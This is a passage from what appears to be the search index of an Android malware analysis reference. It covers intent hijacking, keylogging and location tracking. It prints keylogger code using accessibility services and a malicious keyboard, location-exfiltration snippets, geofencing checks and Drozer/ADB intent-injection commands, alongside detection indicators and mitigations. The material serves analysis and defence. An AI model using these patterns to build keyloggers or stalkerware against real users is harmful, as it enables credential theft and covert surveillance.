mutable and was created with an implicit or empty base intent, the attacker fills in or modifies the intent fields</li> <li>The attacker calls <code>PendingIntent.send()</code> with a modified intent</li> <li>Android executes the modified intent under the original sender's identity, with all of the sender's permissions</li> </ol>"},{"location":"attacks/intent-hijacking/#why-this-is-dangerous","title":"Why This Is Dangerous","text":"<p>The <code>PendingIntent</code> carries the sender's UID and permission set. When the attacker triggers it with a modified intent, the system treats it as an action by the original app. This means:</p> <ul> <li>If the sender holds <code>MANAGE_EXTERNAL_STORAGE</code>, the attacker can read/write arbitrary files</li> <li>If the sender is a system app, the attacker can launch non-exported system components</li> <li>If the sender holds <code>INTERNET</code> and the attacker doesn't, the attacker can exfiltrate data through the sender's network access</li> </ul>"},{"location":"attacks/intent-hijacking/#vulnerable-patterns","title":"Vulnerable Patterns","text":"<pre><code>PendingIntent pi = PendingIntent.getActivity(\n    context, 0, new Intent(), PendingIntent.FLAG_MUTABLE\n);\n</code></pre> <p>An empty base intent with <code>FLAG_MUTABLE</code> is the worst case. The attacker has full control over the intent that gets executed under the sender's identity.</p> <p>A safer pattern uses <code>FLAG_IMMUTABLE</code> and a fully specified explicit intent:</p> <pre><code>Intent explicit = new Intent(context, SpecificActivity.class);\nexplicit.setPackage(\"com.myapp\");\nPendingIntent pi = PendingIntent.getActivity(\n    context, 0, explicit, PendingIntent.FLAG_IMMUTABLE\n);\n</code></pre>"},{"location":"attacks/intent-hijacking/#research-references","title":"Research References","text":"<p>Oversecured's PendingIntent research documented this class of vulnerability across major Android apps, finding mutable PendingIntents with empty or implicit base intents in system components, OEM apps, and popular third-party applications. Google's own security bulletin has patched multiple PendingIntent issues in system services.</p> <p>Android 12 (API 31) requires explicit mutability declaration (<code>FLAG_MUTABLE</code> or <code>FLAG_IMMUTABLE</code>), which forces developers to consciously decide. However, apps that need mutable PendingIntents (e.g., for inline reply in notifications, <code>MediaSession</code> callbacks) remain vulnerable if the base intent is not fully specified.</p>"},{"location":"attacks/intent-hijacking/#families-using-this-technique","title":"Families Using This Technique","text":"Family Technique Target Anatsa Abuses exported activities in banking apps to launch internal transfer screens European banking apps Vultur Exploits exported components to trigger screen recording and keylogging setup Banking and crypto apps SpyNote Launches exported activities of target apps to extract stored data and credentials Enterprise and banking apps Cerberus Intercepts OAuth redirect intents by registering competing intent filters for custom URI schemes Banking apps using OAuth flows SharkBot Hijacks Automated Transfer System flows by injecting intents into banking app exported components European banking apps Joker Intercepts SMS intents and notification listeners to steal OTPs and subscription confirmations Premium SMS services"},{"location":"attacks/intent-hijacking/#testing-for-intent-vulnerabilities","title":"Testing for Intent Vulnerabilities","text":""},{"location":"attacks/intent-hijacking/#enumerating-exported-components-with-drozer","title":"Enumerating Exported Components with Drozer","text":"<p>Drozer is the standard tool for auditing Android IPC attack surfaces. Install it on a test device or emulator and connect via ADB.</p> <p>List all exported activities:</p> <pre><code>dz&gt; run app.activity.info -a com.target.app -u\n</code></pre> <p>List all exported services:</p> <pre><code>dz&gt; run app.service.info -a com.target.app -u\n</code></pre> <p>List all exported broadcast receivers:</p> <pre><code>dz&gt; run app.broadcast.info -a com.target.app -u\n</code></pre> <p>List all exported content providers:</p> <pre><code>dz&gt; run app.provider.info -a com.target.app -u\n</code></pre>"},{"location":"attacks/intent-hijacking/#testing-intent-injection","title":"Testing Intent Injection","text":"<p>Launch an exported activity with crafted extras:</p> <pre><code>dz&gt; run app.activity.start --component com.target.app com.target.app.InternalActivity \\\n    --extra string secret_data \"injected_value\"\n</code></pre> <p>Send an intent to an exported broadcast receiver:</p> <pre><code>dz&gt; run app.broadcast.send --action com.target.app.SENSITIVE_ACTION \\\n    --extra string token \"attacker_token\"\n</code></pre>"},{"location":"attacks/intent-hijacking/#checking-for-intent-redirection","title":"Checking for Intent Redirection","text":"<p>Search the decompiled source for activities that extract an intent from extras and launch it:</p> <pre><code>Intent inner = getIntent().getParcelableExtra(\"next_intent\");\nstartActivity(inner);\n</code></pre> <p>This pattern allows an attacker to send any intent as the <code>next_intent</code> extra, and the vulnerable app will launch it from its own process, reaching non-exported components.</p>"},{"location":"attacks/intent-hijacking/#pendingintent-audit","title":"PendingIntent Audit","text":"<p>Search the codebase for <code>PendingIntent</code> creation and check:</p> <ol> <li>Is <code>FLAG_MUTABLE</code> used? If so, is the base intent fully explicit (component and package set)?</li> <li>Is the base intent empty (<code>new Intent()</code>)? This is exploitable.</li> <li>Is the <code>PendingIntent</code> exposed through notifications, widgets, or IPC? These are reachable by attackers.</li> </ol>"},{"location":"attacks/intent-hijacking/#adb-based-quick-tests","title":"ADB-Based Quick Tests","text":"<p>Without Drozer, use ADB directly to probe exported components:</p> <pre><code>adb shell am start -n com.target.app/.ExportedActivity \\\n    --es sensitive_key \"test_value\"\n\nadb shell am broadcast -a com.target.app.CUSTOM_ACTION \\\n    --es data \"injected\"\n\nadb shell am startservice -n com.target.app/.ExportedService\n</code></pre> <p>If these commands successfully trigger functionality that should be internal-only, the app has an intent hijacking vulnerability.</p>"},{"location":"attacks/keylogging/","title":"Keylogging &amp; Input Capture","text":"<p>Intercepting user keystrokes and text input to steal credentials, OTPs, and sensitive data. On Android, there is no kernel-level keylogger equivalent -- input capture operates through the accessibility framework or by replacing the system keyboard with a malicious Input Method Editor (IME). Both approaches are well-documented abuse paths that require user interaction to enable.</p> <p>See also: Camera &amp; Mic Surveillance, Screen Capture</p> <p>Requirements</p> Requirement Details Accessibility keylogging <code>BIND_ACCESSIBILITY_SERVICE</code> enabled by user IME keylogging Malicious IME installed and selected as default keyboard Targeted capture Package name list of target apps from C2"},{"location":"attacks/keylogging/#techniques","title":"Techniques","text":""},{"location":"attacks/keylogging/#accessibility-based-keylogging","title":"Accessibility-Based Keylogging","text":"<p>The dominant method. An enabled accessibility service receives <code>TYPE_VIEW_TEXT_CHANGED</code> events every time the user types or modifies text in any app. Each event contains the current text content, the source package name, and the view's resource ID.</p> <pre><code>@Override\npublic void onAccessibilityEvent(AccessibilityEvent event) {\n    if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {\n        CharSequence pkg = event.getPackageName();\n        List&lt;CharSequence&gt; textList = event.getText();\n        String fieldId = event.getSource() != null\n            ? event.getSource().getViewIdResourceName()\n            : \"unknown\";\n\n        String captured = \"\";\n        for (CharSequence t : textList) {\n            captured += t.toString();\n        }\n\n        if (isTargetPackage(pkg.toString())) {\n            exfiltrate(pkg.toString(), fieldId, captured);\n        }\n    }\n}\n</code></pre> <p>The accessibility service configuration in <code>res/xml/accessibility_service_config.xml</code>:</p> <pre><code>&lt;accessibility-service\n    xmlns:android=\"http://schemas.android.com/apk/res/android\"\n    android:accessibilityEventTypes=\"typeViewTextChanged|typeViewFocused\"\n    android:accessibilityFeedbackType=\"feedbackGeneric\"\n    android:notificationTimeout=\"100\"\n    android:accessibilityFlags=\"flagRetrieveInteractiveWindows|flagRequestFilterKeyEvents\"\n    android:canRetrieveWindowContent=\"true\" /&gt;\n</code></pre> <p>The <code>flagRequestFilterKeyEvents</code> flag enables the service to receive raw <code>KeyEvent</code> objects via <code>onKeyEvent()</code>, providing individual key presses rather than accumulated text:</p> <pre><code>@Override\nprotected boolean onKeyEvent(KeyEvent event) {\n    if (event.getAction() == KeyEvent.ACTION_DOWN) {\n        int keyCode = event.getKeyCode();\n        logKeystroke(keyCode, event.getUnicodeChar());\n    }\n    return false;\n}\n</code></pre> <p>Returning <code>false</code> allows the key event to pass through to the target app normally. Returning <code>true</code> would consume it, which would alert the user.</p>"},{"location":"attacks/keylogging/#custom-ime-keylogging","title":"Custom IME Keylogging","text":"<p>A malicious <code>InputMethodService</code> replaces the device keyboard. Every keystroke across every app flows through the malware's code, including characters the user deletes before submission -- something accessibility keylogging cannot capture.</p> <pre><code>public class MaliciousIME extends InputMethodService {\n    @Override\n    public View onCreateInputView() {\n        return getLayoutInflater().inflate(R.layout.keyboard, null);\n    }\n\n    @Override\n    public void onStartInput(EditorInfo attribute, boolean restarting) {\n        super.onStartInput(attribute, restarting);\n        logTargetField(attribute.packageName, attribute.fieldId, attribute.inputType);\n    }\n\n    public void onKeyPress(int keyCode) {\n        InputConnection ic = getCurrentInputConnection();\n        if (ic != null) {\n            ic.commitText(String.valueOf((char) keyCode), 1);\n            exfiltrate(keyCode, getCurrentPackage());\n        }\n    }\n}\n</code></pre> <p>The <code>EditorInfo</code> object reveals the input field type (<code>TYPE_TEXT_VARIATION_PASSWORD</code>, <code>TYPE_CLASS_NUMBER</code> for PINs, etc.), allowing the malware to flag high-value captures automatically.</p> <p>Activation requires two steps: the user must install the IME and then select it as the default keyboard. Malware automates the second step by using accessibility to navigate Settings &gt; Language &amp; Input and toggle the keyboard selection.</p>"},{"location":"attacks/keylogging/#proc-based-monitoring-historical","title":"/proc-Based Monitoring (Historical)","text":"<p>Older technique from pre-Android 7 era. The malware reads <code>/proc/self/inputflinger</code> or parses <code>/dev/input/eventX</code> (requires root or specific SELinux context) to intercept raw input events at the Linux kernel level. Android's SELinux policies and procfs restrictions have made this approach non-viable on modern devices without a kernel exploit.</p>"},{"location":"attacks/keylogging/#accessibility-vs-ime-comparison","title":"Accessibility vs IME Comparison","text":"Aspect Accessibility Keylogging Custom IME Activation User enables accessibility service User selects as default keyboard Capture scope Text after each change event Individual keystrokes including deleted characters Password fields May receive masked text (dots) in some apps Sees raw characters before masking Package context Package name + resource ID available Package name + EditorInfo available Persistence Survives app restarts, sometimes device reboots Persists as default keyboard until changed Android restrictions Increasingly restricted per version Minimal restrictions, user choice respected Stealth No visible change to user Keyboard UI must look legitimate Additional capabilities Full accessibility suite (clicks, gestures, screen reading) Limited to input capture only Prevalence in malware Dominant approach (~90% of banking trojans) Rare, used by a few specialized families"},{"location":"attacks/keylogging/#targeted-field-capture","title":"Targeted Field Capture","text":"<p>Banking trojans do not log everything. They maintain a target list (downloaded from C2) mapping package names to fields of interest. This reduces noise and data volume.</p> Target How Identified Event Pattern Username/email Resource ID containing <code>login</code>, <code>email</code>, <code>username</code>, <code>user_id</code> <code>TYPE_VIEW_TEXT_CHANGED</code> on matching view Password <code>TYPE_TEXT_VARIATION_PASSWORD</code> input type, or resource ID containing <code>password</code>, <code>pass</code>, <code>pin</code> <code>TYPE_VIEW_TEXT_CHANGED</code> (may be masked) or <code>onKeyEvent</code> for raw keys OTP/2FA code Resource ID containing <code>otp</code>, <code>code</code>, <code>token</code>, 6-digit numeric input after SMS arrival <code>TYPE_VIEW_TEXT_CHANGED</code> on numeric field Card number <code>TYPE_CLASS_NUMBER</code> with 16-digit pattern, resource ID containing <code>card</code>, <code>pan</code> Sequential numeric input matching card format CVV 3-digit numeric field after card number entry <code>TYPE_VIEW_TEXT_CHANGED</code> on short numeric field <p>Some families also monitor <code>TYPE_VIEW_FOCUSED</code> events to detect when the user enters a login form, then activate intensive logging only for that session.</p>"},{"location":"attacks/keylogging/#android-mitigations","title":"Android Mitigations","text":"Version Change Impact Android 8 Accessibility services must declare handled event types Malware declares all types in config XML Android 11 <code>isAccessibilityTool</code> metadata for Play Store visibility Sideloaded malware unaffected Android 12 Accessibility services cannot observe password fields in some contexts Partial -- depends on app implementation Android 13 Restricted settings blocks accessibility for sideloaded apps Bypassed via session-based package installer Android 14 <code>accessibilityDataSensitive</code> attribute lets apps mark views as sensitive Only effective if target apps adopt the attribute Android 15 Expanded restricted settings enforcement Closes some session-installer bypass routes <p>The <code>accessibilityDataSensitive</code> attribute (Android 14+) is the most significant development. When an app marks an <code>EditText</code> as sensitive, accessibility services not flagged as <code>isAccessibilityTool</code> cannot read its content. Adoption is slow -- most banking apps have not yet implemented it.</p>"},{"location":"attacks/keylogging/#families-using-this-technique","title":"Families Using This Technique","text":"Family Method Specifics Cerberus Accessibility Logs all text input, filters by target package list from C2 Ermac Accessibility Keylogging module inherited from Cerberus codebase Hook Accessibility Keylogging combined with VNC for real-time credential observation SpyNote Accessibility + IME Deploys custom keyboard alongside accessibility for comprehensive capture BankBot Accessibility Early adopter of accessibility keylogging, targeted field capture Anubis Accessibility Dedicated keylogger module with per-app targeting TrickMo Accessibility Screen content capture via tree traversal, targets banking and OTP fields BlankBot Custom IME Replaces system keyboard, uses accessibility to auto-enable the IME Frogblight Custom IME Custom keyboard with accessibility-assisted activation Antidot Accessibility Keylogging with VNC-based remote access Xenomorph Accessibility Targeted keylogging as part of ATS workflow Octo Accessibility Combines keylogging with screen streaming Vultur Accessibility Keylogging alongside MediaProjection screen recording"},{"location":"attacks/keylogging/#credential-theft-workflow","title":"Credential Theft Workflow","text":"<p>Keylogging rarely operates in isolation. The typical credential theft chain:</p> <ol> <li>Target detection -- accessibility monitors <code>TYPE_WINDOW_STATE_CHANGED</code> to detect when a banking app opens</li> <li>Keylogging activation -- intensive logging begins for the target package</li> <li>Credential capture -- username and password captured via <code>TYPE_VIEW_TEXT_CHANGED</code></li> <li>OTP interception -- SMS intercepted via <code>READ_SMS</code> or notification reading, or the OTP input field is logged directly</li> <li>Exfiltration -- captured data sent to C2, tagged with package name and timestamp</li> <li>Account takeover -- attacker uses credentials on their own device, or initiates on-device fraud via ATS</li> </ol> <p>In families with VNC/remote access (Hook, Octo), the attacker may skip keylogging entirely and instead watch the victim's screen during login via screen capture, then take over the session directly.</p>"},{"location":"attacks/keylogging/#detection-during-analysis","title":"Detection During Analysis","text":"Static Indicators <ul> <li><code>TYPE_VIEW_TEXT_CHANGED</code> in decompiled accessibility service code</li> <li><code>InputMethodService</code> subclass in the APK</li> <li><code>flagRequestFilterKeyEvents</code> in accessibility service configuration</li> <li><code>canRetrieveWindowContent=\"true\"</code> in service config</li> <li><code>EditorInfo</code> field inspection in IME code</li> <li>Network calls correlated with <code>onAccessibilityEvent</code> or <code>onKeyEvent</code> handlers</li> </ul> Dynamic Indicators <ul> <li>Accessibility service actively receiving events from banking app packages</li> <li>Data exfiltration spikes correlating with text input activity</li> <li>Custom IME registered in <code>Settings.Secure.DEFAULT_INPUT_METHOD</code></li> <li>Outbound POST requests containing form field names and values</li> </ul>"},{"location":"attacks/keylogging/#frida-detection-script","title":"Frida Detection Script","text":"<p>Monitor accessibility keylogging in real time:</p> <pre><code>Java.perform(function() {\n    var AccessibilityEvent = Java.use(\"android.view.accessibility.AccessibilityEvent\");\n    AccessibilityEvent.getText.implementation = function() {\n        var result = this.getText();\n        var eventType = this.getEventType();\n        if (eventType === 16) {\n            console.log(\"[*] TYPE_VIEW_TEXT_CHANGED from: \" + this.getPackageName());\n            console.log(\"    Text: \" + result.toString());\n            console.log(\"    Source: \" + this.getSource());\n        }\n        return result;\n    };\n});\n</code></pre>"},{"location":"attacks/keylogging/#relationship-to-other-techniques","title":"Relationship to Other Techniques","text":"<ul> <li>Accessibility abuse is the foundation -- keylogging is one of many capabilities gained through an accessibility service</li> <li>Overlay attacks capture credentials through fake UI, while keylogging captures them from the real UI</li> <li>Screen capture provides visual observation of the same data that keylogging captures as text</li> </ul>"},{"location":"attacks/location-tracking/","title":"Location Tracking &amp; Geofencing","text":"<p>Collecting device location data for victim surveillance, movement tracking, and geographically targeted malware activation. Location is a core data collection capability for every major spyware family and a common activation gate for banking trojans that only operate in target countries. Unlike most attack techniques that require complex permission escalation, coarse location data can be derived without any device permissions at all through IP geolocation and cell tower inference.</p> <p>See also: <code>ACCESS_FINE_LOCATION</code>, <code>ACCESS_COARSE_LOCATION</code>, <code>ACCESS_BACKGROUND_LOCATION</code>, Anti-Analysis Techniques, Play Store Evasion</p> <p>Requirements</p> Requirement Details Fine location <code>ACCESS_FINE_LOCATION</code> runtime permission (GPS, ~3m accuracy) Coarse location <code>ACCESS_COARSE_LOCATION</code> runtime permission (cell/WiFi, ~50-300m) Background location <code>ACCESS_BACKGROUND_LOCATION</code> (Android 10+), separate grant Cell tower info <code>ACCESS_FINE_LOCATION</code> for <code>getAllCellInfo()</code>, <code>READ_PHONE_STATE</code> for older APIs No permission needed IP geolocation (server-side), SIM operator codes, system locale <p>Malware that only needs to know the victim's country does not need location permissions at all. <code>TelephonyManager.getSimCountryIso()</code> and server-side IP geolocation provide country-level targeting with zero permissions.</p>"},{"location":"attacks/location-tracking/#location-data-collection-methods","title":"Location Data Collection Methods","text":""},{"location":"attacks/location-tracking/#gps-fine-location","title":"GPS (Fine Location)","text":"<p>The most precise location source, accurate to approximately 3 meters outdoors. Requires <code>ACCESS_FINE_LOCATION</code> and a clear view of satellites. Indoor accuracy degrades significantly.</p> FusedLocationProvider Request <pre><code>FusedLocationProviderClient client = LocationServices.getFusedLocationProviderClient(context);\n\nLocationRequest request = LocationRequest.create()\n    .setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY)\n    .setInterval(30000)\n    .setFastestInterval(10000);\n\nclient.requestLocationUpdates(request, new LocationCallback() {\n    @Override\n    public void onLocationResult(LocationResult result) {\n        Location loc = result.getLastLocation();\n        exfiltrate(loc.getLatitude(), loc.getLongitude(), loc.getAccuracy());\n    }\n}, Looper.getMainLooper());\n</code></pre> <p><code>FusedLocationProviderClient</code> from Google Play Services is the preferred API for most malware because it intelligently combines GPS, WiFi, cell towers, and sensors to maximize accuracy while minimizing battery drain. Heavy GPS polling is a telltale sign of surveillance -- legitimate apps use the fused provider.</p>"},{"location":"attacks/location-tracking/#network-based-coarse-location","title":"Network-Based (Coarse Location)","text":"<p>Cell tower triangulation and WiFi BSSID lookup provide 50-300 meter accuracy with <code>ACCESS_COARSE_LOCATION</code>. Faster than GPS (no satellite lock required) and works indoors.</p> <p>Android 12 introduced the choice between approximate and precise location in the permission dialog. Malware requesting only <code>ACCESS_COARSE_LOCATION</code> still gets sufficient accuracy for city-level tracking and movement pattern analysis.</p>"},{"location":"attacks/location-tracking/#cell-tower-information","title":"Cell Tower Information","text":"<p><code>TelephonyManager</code> exposes cell tower identifiers that can be resolved to geographic coordinates using public databases like OpenCellID or Google's geolocation API.</p> Cell Tower Info Extraction <pre><code>TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);\nList&lt;CellInfo&gt; cells = tm.getAllCellInfo();\nfor (CellInfo cell : cells) {\n    if (cell instanceof CellInfoLte) {\n        CellIdentityLte id = ((CellInfoLte) cell).getCellIdentity();\n        int mcc = id.getMccString() != null ? Integer.parseInt(id.getMccString()) : -1;\n        int mnc = id.getMncString() != null ? Integer.parseInt(id.getMncString()) : -1;\n        int lac = id.getTac();\n        int cid = id.getCi();\n        exfiltrate(mcc, mnc, lac, cid);\n    }\n}\n</code></pre> <p>The MCC/MNC/LAC/CID tuple uniquely identifies a cell tower. Malware exfiltrates these raw values to C2, where server-side lookup resolves them to coordinates. This provides 100-1000 meter accuracy without any GPS usage or Google Play Services dependency.</p>"},{"location":"attacks/location-tracking/#wifi-bssid-mapping","title":"WiFi BSSID Mapping","text":"<p>WiFi access point MAC addresses (BSSIDs) are mapped to geographic coordinates in databases maintained by Google, Apple, and Mozilla. Scanning nearby WiFi networks and sending BSSIDs to a geolocation API provides 10-50 meter accuracy indoors.</p> <p>Since Android 9, WiFi scan results are throttled (4 scans per 2 minutes in foreground, 1 scan per 30 minutes in background). Since Android 10, <code>ACCESS_FINE_LOCATION</code> is required to get scan results at all.</p>"},{"location":"attacks/location-tracking/#passive-location-provider","title":"Passive Location Provider","text":"<p>The passive location provider piggybacks on location requests made by other apps. Instead of actively querying GPS or network providers, the malware registers for passive updates and receives location data whenever any other app on the device requests location.</p> <pre><code>LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);\nlm.requestLocationUpdates(LocationManager.PASSIVE_PROVIDER, 0, 0, locationListener);\n</code></pre> <p>This is stealthier than active location requests because it generates zero additional battery drain and no GPS activation. The tradeoff is unpredictable update frequency -- the malware only gets data when other apps happen to request location.</p>"},{"location":"attacks/location-tracking/#ip-geolocation","title":"IP Geolocation","text":"<p>Server-side IP geolocation requires no device permission. The C2 server resolves the client's public IP to a geographic location using commercial databases (MaxMind, IPinfo, IP2Location). Accuracy ranges from city-level (ISP-assigned IP blocks) to country-level.</p> <p>Malware uses IP geolocation for two purposes:</p> <ol> <li>Activation gating: C2 checks the client IP before delivering payloads, blocking requests from non-target countries or known VPN/cloud IP ranges</li> <li>Approximate tracking: logging victim IP-derived location when precise GPS data is unavailable</li> </ol>"},{"location":"attacks/location-tracking/#background-location-tracking","title":"Background Location Tracking","text":"<p>Background location is the critical capability for persistent surveillance. Each Android version has progressively restricted background location access, and each restriction has forced malware to develop new workarounds.</p>"},{"location":"attacks/location-tracking/#android-version-restrictions","title":"Android Version Restrictions","text":"Version Restriction Impact Android 8 (API 26) Background location throttled to a few updates per hour Active GPS polling from background services degraded Android 8 (API 26) Background service execution limits Long-running location services killed; foreground service required Android 10 (API 29) <code>ACCESS_BACKGROUND_LOCATION</code> as separate permission User must explicitly grant background location in addition to foreground Android 11 (API 30) Background location can only be granted from Settings No runtime dialog -- user must navigate to Settings manually Android 12 (API 31) Approximate vs precise location choice in permission dialog User can grant only approximate location, degrading tracking precision Android 13 (API 33) Foreground service type <code>location</code> must be declared Manifest must include <code>foregroundServiceType=\"location\"</code> Android 14 (API 34) <code>USE_EXACT_ALARM</code> restricted Periodic alarm-based location polling requires justification Android 15 (API 35) Enhanced background location audit in Play Store review Play Store scrutiny on <code>ACCESS_BACKGROUND_LOCATION</code> usage increased"},{"location":"attacks/location-tracking/#malware-workarounds","title":"Malware Workarounds","text":"<p>Foreground service with location type: The primary workaround. The malware starts a foreground service declared with <code>foregroundServiceType=\"location\"</code> and maintains a persistent (often misleading) notification. The notification is disguised as a system process, battery optimization, or connectivity service.</p> <p>WorkManager periodic requests: Scheduling periodic location collection through <code>WorkManager</code>, which survives process death and respects Doze mode constraints while still executing periodically. Each work request grabs the last known location and exfiltrates it.</p> <pre><code>PeriodicWorkRequest locationWork = new PeriodicWorkRequest.Builder(\n    LocationWorker.class, 15, TimeUnit.MINUTES)\n    .setConstraints(new Constraints.Builder()\n        .setRequiredNetworkType(NetworkType.CONNECTED)\n        .build())\n    .build();\n\nWorkManager.getInstance(context).enqueueUniquePeriodicWork(\n    \"loc_sync\", ExistingPeriodicWorkPolicy.KEEP, locationWork);\n</code></pre> <p>Boot receiver with location request: Registering <code>RECEIVE_BOOT_COMPLETED</code> to restart location tracking after device reboot. The receiver starts a foreground service that re-registers for location updates.</p> <p>Accessibility-based auto-grant: Malware with accessibility service access navigates the Settings UI to grant <code>ACCESS_BACKGROUND_LOCATION</code> without genuine user consent. This is particularly effective on Android 11+ where background location requires a Settings toggle rather than a runtime dialog -- the accessibility service opens the Settings page and taps the correct option.</p> <p>AlarmManager wake-ups: Using exact alarms (<code>AlarmManager.setExactAndAllowWhileIdle()</code>) to wake the device from Doze mode and capture a location fix at fixed intervals.</p>"},{"location":"attacks/location-tracking/#stalkerware-persistence","title":"Stalkerware Persistence","text":"<p>Commercial stalkerware (Cerberus rebranded as \"monitoring software\", FlexiSpy, mSpy, Cocospy) maintains persistent background location through a combination of techniques:</p> <ul> <li>Foreground service with <code>IMPORTANCE_MIN</code> notification (barely visible)</li> <li><code>REQUEST_IGNORE_BATTERY_OPTIMIZATIONS</code> to avoid Doze mode killing</li> <li><code>RECEIVE_BOOT_COMPLETED</code> for restart after reboot</li> <li>Device admin enrollment to resist uninstallation</li> <li>Hiding the app icon from the launcher</li> </ul> <p>The result is continuous location streaming at 30-second to 5-minute intervals, surviving reboots, battery optimization, and user attempts to find and remove the app.</p>"},{"location":"attacks/location-tracking/#geofencing-based-malware-activation","title":"Geofencing-Based Malware Activation","text":"<p>Geofencing is the most operationally significant use of location in Android malware. Rather than tracking victims, it determines where malware should and should not operate. This is both an evasion technique (avoid analysis environments) and a targeting mechanism (only attack users in profitable regions).</p>"},{"location":"attacks/location-tracking/#sim-operator-code-checks-mccmnc","title":"SIM Operator Code Checks (MCC/MNC)","text":"<p>The most reliable device-side geofencing method. The Mobile Country Code (MCC) and Mobile Network Code (MNC) are set by the physical SIM card and cannot be spoofed without inserting a SIM from the target country.</p> <pre><code>TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);\nString simCountry = tm.getSimCountryIso();\nString networkCountry = tm.getNetworkCountryIso();\nString simOperator = tm.getSimOperator();\n</code></pre> API What It Returns Spoofing Difficulty <code>getSimCountryIso()</code> ISO country code from SIM (e.g., \"de\") High -- requires physical SIM from that country <code>getNetworkCountryIso()</code> ISO country code from current network registration High -- VPN does not change this <code>getSimOperator()</code> MCC+MNC string (e.g., \"26201\" for Telekom DE) High -- SIM-bound <code>getNetworkOperator()</code> MCC+MNC of current network High -- requires roaming on target network <p>This is why banking trojans targeting German banks check for German SIMs, and analysts need German SIMs to trigger the malware. MITRE ATT&amp;CK documents this as T1627.001 (Geofencing).</p>"},{"location":"attacks/location-tracking/#locale-based-activation","title":"Locale-Based Activation","text":"<pre><code>String language = Locale.getDefault().getLanguage();\nString country = Locale.getDefault().getCountry();\n</code></pre> <p>Checking the system language and region. Less reliable than SIM checks because users can change these in Settings, but useful as an additional signal. Some families combine locale with SIM checks -- both must match for activation.</p>"},{"location":"attacks/location-tracking/#server-side-ip-geofencing","title":"Server-Side IP Geofencing","text":"<p>The C2 server checks the client's source IP against geolocation databases before delivering payloads. This is the hardest geofencing method for analysts to bypass because the logic runs entirely server-side.</p> <p>Behaviors include:</p> <ul> <li>Returning HTTP 404 or empty responses for non-target IPs</li> <li>Serving a benign APK to non-target regions and a malicious APK to targets</li> <li>Blocking known VPN, cloud, and datacenter IP ranges</li> <li>Requiring the device IP to match the SIM country (IP from Germany + German SIM = deliver payload)</li> </ul>"},{"location":"attacks/location-tracking/#gps-based-geofencing","title":"GPS-Based Geofencing","text":"<p>Some families use the Android <code>GeofencingClient</code> API or manual coordinate comparison to activate only within specific geographic boundaries.</p> <pre><code>GeofencingClient client = LocationServices.getGeofencingClient(context);\nGeofence geofence = new Geofence.Builder()\n    .setRequestId(\"target_zone\")\n    .setCircularRegion(latitude, longitude, radiusMeters)\n    .setExpirationDuration(Geofence.NEVER_EXPIRE)\n    .setTransitionTypes(Geofence.GEOFENCE_TRANSITION_ENTER)\n    .build();\n</code></pre> <p>This is less common in commodity malware (GPS requires permissions and satellite access) but observed in targeted spyware that activates surveillance only when the victim enters specific locations.</p>"},{"location":"attacks/location-tracking/#real-world-geofencing-examples","title":"Real-World Geofencing Examples","text":"Family Geofencing Method Targeting Behavior Anatsa SIM country + IP geofencing Targets UK, DE, ES, SK, SI, CZ. Avoids Eastern European and Chinese IP ranges Mandrake C2-side geofencing Server decides payload delivery based on device profile. Non-target regions never receive malware GoldPickaxe SIM + locale Specifically targets Thailand and Vietnam. Checks for Thai/Vietnamese SIM and language Anatsa Installed app check Scans for banking apps from target countries as secondary geofence GodFather System language Avoids activating on devices with Russian, Azerbaijani, Uzbek, Kazakh, Kyrgyz, Tajik, Armenian, or Belarusian languages Cerberus SIM + locale Avoided activating in CIS countries Mamont SIM country Targets Russian-speaking countries specifically"},{"location":"attacks/location-tracking/#location-as-intelligence","title":"Location as Intelligence","text":""},{"location":"attacks/location-tracking/#stalkerware-and-physical-surveillance","title":"Stalkerware and Physical Surveillance","text":"<p>Stalkerware apps provide real-time location dashboards showing victim movements on a map. Features include:</p> <ul> <li>Live GPS tracking with configurable polling intervals</li> <li>Location history with timestamped breadcrumb trails</li> <li>Geofence alerts when the victim enters or leaves defined areas</li> <li>Address resolution (reverse geocoding) for each location point</li> <li>Speed and altitude data for travel pattern analysis</li> </ul> <p>Kaspersky reported 13,279 unique users affected by stalkerware in 2024, but actual numbers are higher because stalkerware is designed to be undetectable.</p>"},{"location":"attacks/location-tracking/#state-sponsored-location-collection","title":"State-Sponsored Location Collection","text":"<p>Every major state-sponsored spyware platform collects location as a core surveillance function:</p> Family Location Capability Details Pegasus GPS + cell + WiFi Real-time location streaming and historical tracking. Amnesty International's forensic methodology documents location collection as a standard capability Predator GPS + cell + WiFi Five-module architecture includes location harvesting Hermit GPS + cell tower RCS Lab spyware collects location alongside call/SMS interception FinSpy GPS + cell + WiFi Location tracking module with configurable intervals EagleMsgSpy GPS Chinese law enforcement surveillance tool with location collection"},{"location":"attacks/location-tracking/#combining-location-with-sensor-data","title":"Combining Location with Sensor Data","text":"<p>Advanced spyware correlates location with other sensor data to build comprehensive victim profiles:</p> <ul> <li>Accelerometer + location: Determine if the victim is walking, driving, or stationary</li> <li>WiFi probe requests + location: Map physical movements through WiFi networks encountered</li> <li>Barometer + GPS: Floor-level positioning inside buildings</li> <li>Cell tower transitions: Movement patterns even without GPS</li> </ul>"},{"location":"attacks/location-tracking/#location-spoofing-detection","title":"Location Spoofing Detection","text":"<p>Some malware and many commercial apps check for mock location providers to detect analysis environments where analysts use fake GPS to trigger geofenced behavior.</p>"},{"location":"attacks/location-tracking/#detection-techniques","title":"Detection Techniques","text":"<pre><code>private boolean isMockLocation(Location location) {\n    if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.JELLY_BEAN_MR2) {\n        return location.isFromMockProvider();\n    }\n    return Settings.Secure.getString(\n        getContentResolver(),\n        Settings.Secure.ALLOW_MOCK_LOCATION).equals(\"1\");\n}\n</code></pre> Check API Android Version Mock provider flag <code>Location.isFromMockProvider()</code> 18+ Mock location setting <code>Settings.Secure.ALLOW_MOCK_LOCATION</code> Deprecated in API 23, removed in 31 Mock provider flag (new) <code>Location.isMock()</code> 31+ Provider list check <code>LocationManager.getProviders()</code> for non-standard providers All"},{"location":"attacks/location-tracking/#why-this-matters-for-analysis","title":"Why This Matters for Analysis","text":"<p>Analysts frequently use mock location apps (Fake GPS, GPS Joystick) or emulator location spoofing to trigger geofenced malware. If the malware checks <code>isFromMockProvider()</code>, mock location will not work. Workarounds:</p> <ul> <li>Use Frida to hook <code>isFromMockProvider()</code> and return <code>false</code></li> <li>Use a rooted device with Magisk module that patches the mock 